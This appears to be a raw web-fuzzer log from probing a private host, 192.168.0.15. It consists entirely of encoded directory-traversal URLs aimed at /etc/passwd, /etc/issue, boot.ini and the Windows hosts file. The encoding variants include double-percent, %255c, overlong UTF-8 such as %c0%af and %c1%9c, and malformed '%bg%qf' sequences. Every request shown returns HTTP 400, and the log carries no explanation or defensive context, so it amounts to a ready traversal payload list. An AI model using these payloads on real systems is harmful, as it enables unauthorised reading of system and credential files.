2,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
4,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
3,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
5,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
6,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
7,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
8,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
9,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
10,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
20,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
21,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66boot.ini
22,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66etc%%32%%66issue
23,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
24,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
25,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
26,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
27,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
11,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
28,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
29,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
31,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
32,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
36,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
30,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
33,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
34,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
35,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
85,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
84,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
81,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
82,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
86,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
37,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
38,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
39,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
40,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
89,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
90,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
87,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
93,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255cboot.ini
92,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
91,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
41,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
42,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
43,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
44,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
45,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63boot.ini
106,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
100,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
102,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
105,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
104,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
49,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
46,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63etc%%35%%63issue
47,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
48,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
113,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
109,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
111,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afpasswd
108,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
50,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
112,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
51,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
115,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afpasswd
114,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
116,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afwindows%25c0%25afsystem32%25c0%25afdrivers%25c0%25afetc%25c0%25afhosts
122,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
117,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25afboot.ini
52,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
60,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
123,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
124,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
125,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cboot.ini
53,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
54,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
127,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
61,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
133,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cboot.ini
131,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
132,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
129,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cboot.ini
130,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
134,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
136,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
62,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
135,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
145,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
146,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
138,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
139,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
142,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259cetc%25c1%259cissue
140,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts
137,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259c%%32%%65%%32%%65%25c1%259cboot.ini
143,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259cetc%25c1%259cpasswd
141,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c1%259cboot.ini
63,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
152,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
148,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
147,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
151,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
155,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
153,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
149,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
150,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
154,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
156,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
160,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
55,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
161,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
162,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
158,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fissue
157,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fboot.ini
163,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fetc%2fpasswd
164,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2f%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
165,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2fboot.ini
167,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2fetc%2fpasswd
56,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
170,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
171,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
169,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
168,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
57,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fboot.ini
1,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
173,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
174,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
175,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
176,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
181,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
186,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
179,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
178,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
180,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
184,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
183,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
182,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cissue
177,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
185,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cboot.ini
188,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
190,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5cetc%5cissue
195,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
194,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
193,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
187,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cetc%5cpasswd
191,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5cetc%5cpasswd
189,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5cboot.ini
192,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
204,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
203,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
202,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
199,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
201,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
198,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
58,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
197,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
205,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
